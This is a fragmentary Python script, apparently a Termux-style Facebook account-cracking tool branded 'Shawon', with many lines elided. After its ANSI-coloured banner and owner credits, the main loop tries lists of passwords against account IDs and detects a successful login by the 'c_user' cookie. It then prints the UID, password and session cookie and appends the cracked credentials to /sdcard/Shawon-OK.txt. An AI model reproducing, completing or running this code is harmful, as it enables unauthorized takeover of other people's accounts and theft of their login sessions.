...
ha = current.day
today = date.today()
#𝐒𝐡𝐚𝐰𝐨𝐧2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96m𝐒𝐡𝐚𝐰𝐨𝐧')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-𝐒𝐡𝐚𝐰𝐨𝐧/1.2.0 OPN-B'
...
\033[1;92m.       ╚══════╝╚══════╝ ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
 \033[1;92m╔=================================╗
 |\033[1;97m[\033[1;92m❯\033[1;97m]OWNER     \033[1;31m:  \033[1;97m𝐒𝐡𝐚𝐰𝐨𝐧\033[1;92m           | 
 |\033[1;97m[\033[1;92m❯\033[1;97m]FACEBOOK  \033[1;31m:  \033[1;97mŠejâň Řahmăn\033[1;92m     |   
...
def main():
    ...
    if sh =='2':
       ...
       sh7()
    if sh =='3':
       os.system('xdg-open https://www.facebook.com/sejanrahman420')
       main()  
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio 𝐒𝐡𝐚𝐰𝐨𝐧_OK.mp3")
                print('\033[1;92m[𝐒𝐡𝐚𝐰𝐨𝐧-OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                print(f'{B}[COOKIE💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/𝐒𝐡𝐚𝐰𝐨𝐧-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91m𝐒𝐡𝐚𝐰𝐨𝐧","\x1b[1;92m𝐒𝐡𝐚𝐰𝐨𝐧","\x1b[1;93m𝐒𝐡𝐚𝐰𝐨𝐧","\x1b[1;94m𝐒𝐡𝐚𝐰𝐨𝐧","\x1b[1;95m𝐒𝐡𝐚𝐰𝐨𝐧","\x1b[1;96m𝐒𝐡𝐚𝐰𝐨𝐧","\x1b[1;97m𝐒𝐡𝐚𝐰𝐨𝐧","\x1b[1;91m𝐒𝐡𝐚𝐰𝐨𝐧","\x1b[1;92m𝐒𝐡𝐚𝐰𝐨𝐧","\x1b[1;93m𝐒𝐡𝐚𝐰𝐨𝐧","\x1b[1;94m𝐒𝐡𝐚𝐰𝐨𝐧","\x1b[1;95m𝐒𝐡𝐚𝐰𝐨𝐧","\x1b[1;96m𝐒𝐡𝐚𝐰𝐨𝐧"])
